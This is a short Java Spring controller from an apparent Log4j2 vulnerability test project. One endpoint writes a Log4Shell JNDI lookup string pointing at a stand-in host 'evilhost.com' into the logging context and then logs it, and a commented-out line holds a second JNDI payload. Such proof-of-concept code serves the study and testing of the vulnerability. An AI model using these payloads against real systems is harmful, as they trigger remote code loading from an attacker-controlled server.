package me.mole.log4j2vulns.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/log4j2")
public class Log4j2Controller {
    private static Logger logger = LogManager.getLogger(Log4j2Controller.class);

    @PostMapping("/test1")
    public void test1(@RequestBody String data) {
//        String s = "${jndi:ldap://127.0.0.1:8085/ExploitEcho}";
//        logger.error(data);

        String poc = "${jndi:ldap://127.0.0.1#evilhost.com:8085/a}";

        ThreadContext.put("tainted", poc);
        logger.error("foo");
    }
}
